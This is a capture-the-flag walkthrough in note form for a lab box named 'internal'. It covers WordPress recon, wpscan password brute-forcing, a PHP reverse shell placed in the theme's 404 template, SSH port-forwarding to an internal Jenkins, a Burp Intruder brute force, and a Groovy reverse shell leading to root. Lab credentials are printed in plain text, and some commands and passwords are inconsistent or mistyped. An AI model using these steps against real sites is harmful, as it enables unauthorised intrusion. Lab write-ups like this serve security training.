# WordPress

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 11258–11421. Examples are lab-specific and need verification.

# Word press

Ref: https://www.youtube.com/watch?v=2TmguIvR3Kw

$ `nmap -sCSV ip`

$ `dirsearch.py -u 10.10.67.11 -E -x 400,500 -r -t 100`

access the site http://10.10.10.10/blog

Modify etc hosts

$ `nano /etc/hosts`

add our ip as internal.thm save that

Now access http://10.10.10.10/blog, got actual web page

Now go to login page

internal.thm/blog/wp-login.php

Now run wordpress scan

$ `wpscan —url [http://10.10.10.10/blog](http://internal.thm/blog) -e vp,u`

Results: No plugins found and one user found: admin

Now brute force password

$ `wpscan —url http://10.10.10.10/blog -—usernames admin -—passwords /root/Desktop/passes/rockyou.txt -—max-threads 50`

Got credentials admin: my2boys

Use the credentials and login to the website

After gets login, go through the application

Go to post > private post

Open that private post

Got one user credentials william:arnold147

Now upload malicious php and get reverse shell

In terminal make the netcat listen

$ `nc -lvnp 53`

Now go to the website

Appearance > Theme editor > 404 template

Go to tools in your terminal and copy the php-reverse-shell code

paste the code in 404 template and edit the ip to kali ip and update it

Now go to the 404 template page

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

Now in the netcat we get reverse command shell

now type the commands in shell

$ `id`

$ `ls -la`

$ `cd /opt`

$ `ls -la`

$ cat wp-save.txt

We got one more user cred aubreanna:bubb13guM!@123

Now open new terminal and try to login that user vis ssh

$ `ssh aubreanna@10.10.10.10`

password: bubb13guM!@123

Got user terminal

aubreanna@internal$ get the user flag here

aubreanna@internal$ `ls`

aubreanna@internal$ `jenkins.txt`

Internal jenkins is running on 172.17.0.2:8000

aubreanna@internal$ `netstat -ano`

Got to the terminal

$ `ssh -L 8080:172.17.0.2:8080 auberenna@10.10.10.10`

password: bubb13guM!@#123

Now we got login also with docker0 ip

Now go to the website and type 127.0.0.1:8080 is the jenkins login page

Now brute force the password of admin

Go to burp suite

capture the login request

send to intruder

add password

payload use: desktop/customwordlist/kerbrutpass.txt

Got cred admin:spongebob

login to the website using the credentials

Manage jenkins> script console

open netcat listener in aubereana terminal

aubreanna@internal$ `nc -nvlp 8044`

enter the script from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

change cmd = “/bin/sh”

put your ip in string host

Now run

Got reverse shell in netcat listerner

id

ls -la

cd /opt

ls -la

cat note.txt

Got root credentials root:tr0ub13guM!@#123

Now open the new terminal and login via ssh

$ `ssh root@10.10.10.10`

password: tr0ub13guM!@#123

Got root user

root@internal$ `la -la`

root@internal$ `cat root.txt`

Got root flag !
